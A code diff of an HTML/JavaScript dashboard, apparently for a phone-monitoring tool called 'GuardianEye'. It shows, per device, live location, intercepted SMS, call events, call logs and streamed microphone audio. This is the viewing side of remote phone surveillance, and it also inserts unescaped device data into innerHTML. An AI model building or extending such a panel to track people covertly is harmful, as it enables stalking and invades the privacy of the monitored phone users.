@@ -1,126 +1,61 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>GuardianEye Dashboard</title>
-  <script src="/socket.io/socket.io.js"></script>
-  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 20px;
-      background: #f4f6f9;
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+
+// Keep track of devices
+const devices = {};
+
+socket.on("device-registered", (data) => {
+    const { deviceId, deviceName } = data;
+
+    if (!devices[deviceId]) {
+        // create new section for this device
+        const div = document.createElement("div");
+        div.id = "device-" + deviceId;
+        div.innerHTML = `
+            <h3>${deviceName} (${deviceId})</h3>
+            <p id="loc-${deviceId}">Location: waiting...</p>
+            <audio id="audio-${deviceId}" controls autoplay></audio>
+            <p id="sms-${deviceId}">SMS: none</p>
+            <p id="call-${deviceId}">Call: none</p>
+            <hr/>
+        `;
+        document.body.appendChild(div);
+        devices[deviceId] = true;
     }
-    h1 { text-align: center; }
-    #devices { display: flex; flex-wrap: wrap; gap: 20px; }
-    .device-panel {
-      flex: 1 1 45%;
-      background: #fff;
-      border-radius: 12px;
-      padding: 15px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      min-width: 400px;
+});
+
+socket.on("location-update", (data) => {
+    const { deviceId, lat, lng } = data;
+    document.getElementById("loc-" + deviceId).innerText =
+        `Location: ${lat}, ${lng}`;
+});
+
+socket.on("sms-received", (data) => {
+    const { deviceId, number, body } = data;
+    document.getElementById("sms-" + deviceId).innerText =
+        `SMS from ${number}: ${body}`;
+});
+
+socket.on("call-event", (data) => {
+    const { deviceId, number, state } = data;
+    document.getElementById("call-" + deviceId).innerText =
+        `Call ${state}: ${number}`;
+});
+
+socket.on("audio-chunk", (data) => {
+    const { deviceId, chunk } = data;
+    const audio = document.getElementById("audio-" + deviceId);
+
+    if (audio) {
+        const byteCharacters = atob(chunk);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], { type: "audio/wav" });
+        audio.src = URL.createObjectURL(blob);
     }
-    .map { height: 250px; border-radius: 8px; margin-bottom: 10px; }
-    table { width: 100%; margin-top: 10px; border-collapse: collapse; }
-    th, td { border: 1px solid #ddd; padding: 6px; text-align: center; }
-    th { background: #007bff; color: #fff; }
-    .eventList { max-height: 120px; overflow-y: auto; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; padding: 5px; }
-  </style>
-</head>
-<body>
-  <h1>GuardianEye Dashboard</h1>
-  <div id="status">🔴 Disconnected</div>
-
-  <div id="devices"></div> <!-- container for dynamic device panels -->
-
-  <script>
-    const socket = io();
-    const statusDiv = document.getElementById("status");
-    const devicesContainer = document.getElementById("devices");
-    const devicePanels = {}; // store UI refs per device
-
-    socket.on("connect", () => {
-      statusDiv.innerText = "🟢 Connected to server";
-      statusDiv.style.color = "green";
-      socket.emit("listener-register");
-    });
-
-    socket.on("disconnect", () => {
-      statusDiv.innerText = "🔴 Disconnected";
-      statusDiv.style.color = "red";
-    });
-
-    // === CREATE PANEL FOR DEVICE ===
-    function createDevicePanel(deviceId) {
-      if (devicePanels[deviceId]) return devicePanels[deviceId];
-
-      const panel = document.createElement("div");
-      panel.className = "device-panel";
-      panel.innerHTML = `
-        <h2>Device: ${deviceId}</h2>
-        <div class="map" id="map-${deviceId}"></div>
-        <h3>📋 Call Logs</h3>
-        <table>
-          <thead><tr><th>Number</th><th>Type</th><th>Date</th><th>Duration</th></tr></thead>
-          <tbody id="logs-${deviceId}"><tr><td colspan="4">Waiting...</td></tr></tbody>
-        </table>
-        <h3>📞 Call Events</h3>
-        <div id="calls-${deviceId}" class="eventList"><div>Waiting...</div></div>
-        <h3>📨 SMS</h3>
-        <div id="sms-${deviceId}" class="eventList"><div>Waiting...</div></div>
-      `;
-      devicesContainer.appendChild(panel);
-
-      const map = L.map(`map-${deviceId}`).setView([20,78], 5);
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-
-      devicePanels[deviceId] = {
-        map, marker: null,
-        logsBody: panel.querySelector(`#logs-${deviceId}`),
-        callsList: panel.querySelector(`#calls-${deviceId}`),
-        smsList: panel.querySelector(`#sms-${deviceId}`)
-      };
-      return devicePanels[deviceId];
-    }
-
-    // === DATA HANDLERS ===
-    socket.on("location-update", ({ deviceId, lat, lng }) => {
-      const panel = createDevicePanel(deviceId);
-      if (!lat || !lng) return;
-      if (!panel.marker) {
-        panel.marker = L.marker([lat,lng]).addTo(panel.map);
-      } else {
-        panel.marker.setLatLng([lat,lng]);
-      }
-      panel.map.setView([lat,lng], 14);
-    });
-
-    socket.on("call-logs", ({ deviceId, logs }) => {
-      const panel = createDevicePanel(deviceId);
-      const tbody = panel.logsBody;
-      tbody.innerHTML = "";
-      logs.forEach(log => {
-        const row = document.createElement("tr");
-        row.innerHTML = `<td>${log.number}</td><td>${log.type}</td><td>${new Date(log.date).toLocaleString()}</td><td>${log.duration}</td>`;
-        tbody.appendChild(row);
-      });
-    });
-
-    socket.on("call-event", ({ deviceId, event }) => {
-      const panel = createDevicePanel(deviceId);
-      const div = document.createElement("div");
-      div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number}`;
-      panel.callsList.prepend(div);
-    });
-
-    socket.on("sms-received", ({ deviceId, sms }) => {
-      const panel = createDevicePanel(deviceId);
-      const div = document.createElement("div");
-      div.innerText = `[${new Date().toLocaleTimeString()}] ${sms.number}: ${sms.body}`;
-      panel.smsList.prepend(div);
-    });
-  </script>
-</body>
-</html>
+});
+</script>
